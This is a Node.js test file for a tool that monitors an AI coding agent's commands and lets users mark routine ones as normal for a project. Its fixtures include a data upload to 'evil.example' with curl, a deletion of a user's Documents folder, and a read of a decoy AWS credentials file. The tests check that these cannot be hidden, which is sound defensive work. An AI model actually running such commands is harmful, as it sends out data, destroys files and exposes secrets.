import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { applyBaseline, baselineFromEvent, canBaseline, fingerprint, revertBaseline } from '../public/baseline.js';

const agent = { id: 'claude-1', label: 'Claude Code', project: 'app', cwd: '/work/app' };

test('command fingerprints preserve paths, quoted whitespace, numbers and long suffixes', () => {
  for (const command of ['git -C /Users/ada/app status', 'curl https://example.com/123456', 'echo "a   b"', 'npm install ' + 'a'.repeat(200)]) {
    assert.equal(fingerprint(command), command);
  }
});

test('a cache cleanup exception does not suppress deletion of personal files', () => {
  const event = { kind: 'process', risk: 'medium', command: 'rm -rf /tmp/build-cache', reasons: ['deleted a folder and everything inside it'] };
  const mark = baselineFromEvent(event, agent);
  assert.equal(applyBaseline(event, [mark], agent).risk, 'info');
  for (const command of ['rm -rf /Users/alex/Documents', 'rm -rf /tmp/build-cache other-folder']) {
    assert.equal(applyBaseline({ ...event, command }, [mark], agent).risk, 'medium');
  }
  const legacy = { ...mark, value: 'rm -rf <path>' };
  delete legacy.matchVersion;
  assert.equal(applyBaseline(event, [legacy], agent).risk, 'medium');
});

test('decoy reads and high risk cannot be marked normal', () => {
  const decoy = { kind: 'file', risk: 'critical', bait: true, path: '/home/a/.harness/bait/aws_credentials', reasons: ['opened a decoy secret'] };
  const upload = { kind: 'process', risk: 'high', command: 'curl -X POST https://evil.example', reasons: ['uploaded data to a server'] };
  const install = { kind: 'process', risk: 'low', command: 'npm install', reasons: ['installed packages (packages can run their own setup code)'] };
  assert.equal(canBaseline(decoy), false);
  assert.equal(canBaseline(upload), false);
  assert.equal(canBaseline(install), true);
  assert.match(baselineFromEvent(decoy, agent).error, /will not hide/);
});

test('a saved command downgrades the next match in that project only', () => {
  const event = { id: 4, kind: 'process', risk: 'medium', command: 'sudo npm test', reasons: ['asked for administrator access'], agentId: agent.id };
  const made = baselineFromEvent(event, agent, 1000);
  assert.equal(made.type, 'command');
  assert.equal(made.value, 'sudo npm test');
  const quiet = applyBaseline(event, [made], agent);
  assert.equal(quiet.baseline, true);
  assert.equal(quiet.risk, 'info');
  assert.equal(quiet.originalRisk, 'medium');
  const other = applyBaseline(event, [made], { ...agent, cwd: '/work/other' });
  assert.equal(other.baseline, undefined);
  assert.equal(other.risk, 'medium');
  const back = revertBaseline(quiet);
  assert.equal(back.risk, 'medium');
  assert.equal(back.baseline, undefined);
  assert.match(quiet.reasons.at(-1), /^this was marked as normal for this project/);
  assert.equal(back.reasons.some((r) => /marked as normal for this project/.test(r)), false);
});

test('baselines are written to the data folder and can be removed', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'harness-base-'));
  process.env.HARNESS_DATA_DIR = dir;
  const { addBaseline, listBaselines, removeBaseline } = await import('../src/baselines.js');
  const entry = { id: 'b-1', projectKey: 'cwd:/work/app', project: 'app', type: 'host', value: 'builds.example', createdAt: 1 };
  assert.equal(addBaseline(entry).added, true);
  assert.equal(addBaseline(entry).added, false);
  assert.equal(listBaselines().length, 1);
  assert.equal(JSON.parse(fs.readFileSync(path.join(dir, 'baselines.json'), 'utf8'))[0].value, 'builds.example');
  assert.equal(removeBaseline('b-1').length, 0);

  const legacy = { id: 'b-old', projectKey: 'cwd:/work/app', project: 'app', type: 'command', value: 'npm install', createdAt: 1 };
  assert.equal(addBaseline(legacy).added, true);
  assert.equal(addBaseline({ ...legacy, id: 'b-old-2' }).added, false);
  const fresh = { id: 'b-new', projectKey: 'cwd:/work/app', project: 'app', type: 'command', value: 'npm install', matchVersion: 2, createdAt: 2 };
  const replaced = addBaseline(fresh);
  assert.equal(replaced.added, true);
  assert.deepEqual(replaced.baselines.map((b) => b.id), ['b-new']);
  const event = { kind: 'process', risk: 'low', command: 'npm install', reasons: ['installed packages'] };
  assert.equal(applyBaseline(event, replaced.baselines, agent).risk, 'info');
  assert.equal(addBaseline({ ...fresh, id: 'b-again' }).added, false);
  assert.equal(listBaselines().length, 1);
});
